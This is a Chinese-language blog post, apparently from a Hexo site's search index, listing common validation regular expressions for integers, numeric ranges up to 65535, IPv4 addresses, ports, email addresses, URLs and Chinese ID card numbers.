<h1 id="常用正则"><a href="#常用正则" class="headerlink" title="常用正则"></a>常用正则</h1><ul>
<li>非负整数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^(0|[1-9][0-9]*)$</span><br></pre></td></tr></table></figure>

<ul>
<li>[0-N]的数字规律，以N为65535为例（最大为5位数）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1位数字：(0|[1-9])</span><br><span class="line">2位数字：[1-9][0-9]&#123;1&#125;</span><br><span class="line">3位数字：[1-9][0-9]&#123;2&#125;</span><br><span class="line">4位数字：[1-9][0-9]&#123;3&#125;</span><br><span class="line">5位数字：</span><br><span class="line"> - 以[1-5]开头：[1-5][0-9]&#123;4&#125;</span><br><span class="line"> - 以6[0-4]开头：6[0-4][0-9]&#123;3&#125;</span><br><span class="line"> - 以65[0-4]开头：65[0-4][0-9]&#123;2&#125;</span><br><span class="line"> - 以655[0-2]开头：655[0-2][0-9]&#123;1&#125;，&#123;1&#125;可省略</span><br><span class="line"> - 最后，6553[0-5]</span><br><span class="line"></span><br><span class="line">1-4位数字：(0|[1-9][0-9]&#123;0,3&#125;)；</span><br><span class="line">最大位数（这里为5）：([1-5][0-9]&#123;4&#125;|6[0-4][0-9]&#123;3&#125;|65[0-4][0-9]&#123;2&#125;|655[0-2][0-9]|6553[0-5])；</span><br><span class="line">总结：(0|[1-9][0-9]&#123;0,3&#125;|[1-5][0-9]&#123;4&#125;|6[0-4][0-9]&#123;3&#125;|65[0-4][0-9]&#123;2&#125;|655[0-2][0-9]|6553[0-5])</span><br></pre></td></tr></table></figure>

<ul>
<li>IP</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^((0|[1-9][0-9]&#123;0,1&#125;|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])\.)&#123;3&#125;(0|[1-9][0-9]&#123;0,1&#125;|1[0-9]&#123;2&#125;|2[0-4][0-9]|25[0-5])$</span><br></pre></td></tr></table></figure>

<ul>
<li>PORT</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^(0|[1-9][0-9]&#123;0,3&#125;|[1-5][0-9]&#123;4&#125;|6[0-4][0-9]&#123;3&#125;|65[0-4][0-9]&#123;2&#125;|655[0-2][0-9]|6553[0-5])$</span><br></pre></td></tr></table></figure>

<ul>
<li>邮箱</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 常见</span><br><span class="line">^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]&#123;2,&#125;$</span><br><span class="line"></span><br><span class="line"># 支持国际化</span><br><span class="line">^(?=.&#123;1,254&#125;$)(?=.&#123;1,64&#125;@)[-!#$%&amp;&#x27;*+/0-9=?A-Z^_`a-z&#123;|&#125;~]+(\.[-!#$%&amp;&#x27;*+/0-9=?A-Z^_`a-z&#123;|&#125;~]+)*@[A-Za-z0-9]([A-Za-z0-9-]&#123;0,61&#125;[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]&#123;0,61&#125;[A-Za-z0-9])?)*$</span><br></pre></td></tr></table></figure>

<ul>
<li>URL，例如：<a href="https://www.baidu.com/s?ie=utf-8&f=8">https://www.baidu.com/s?ie=utf-8&amp;f=8</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 常见</span><br><span class="line">^(https?|ftp):\/\/([^\s\/?#]+)([^\s?#]*)(\?([^\s#]*))?(#(.*))?$</span><br><span class="line"></span><br><span class="line"># 严格</span><br><span class="line">^(https?|ftp):\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]&#123;1,256&#125;\.[a-zA-Z0-9()]&#123;1,6&#125;\b([-a-zA-Z0-9()@:%_\+.~#?&amp;//=]*)$</span><br></pre></td></tr></table></figure>

<ul>
<li>身份证号码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 18位</span><br><span class="line">^[1-9]\d&#123;5&#125;(18|19|20)\d&#123;2&#125;(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d&#123;3&#125;[\dXx]$</span><br><span class="line"></span><br><span class="line"># 15位</span><br><span class="line">^[1-9]\d&#123;5&#125;\d&#123;2&#125;(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d&#123;3&#125;$</span><br><span class="line"></span><br><span class="line"># 同时支持15、18位</span><br><span class="line">(^[1-9]\d&#123;5&#125;(18|19|20)\d&#123;2&#125;(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d&#123;3&#125;[\dXx]$)|(^[1-9]\d&#123;5&#125;\d&#123;2&#125;(0[1-9]|1[0-2])(0[1-9]|[12]\d|3[01])\d&#123;3&#125;$)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>正则表达式</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
</search>
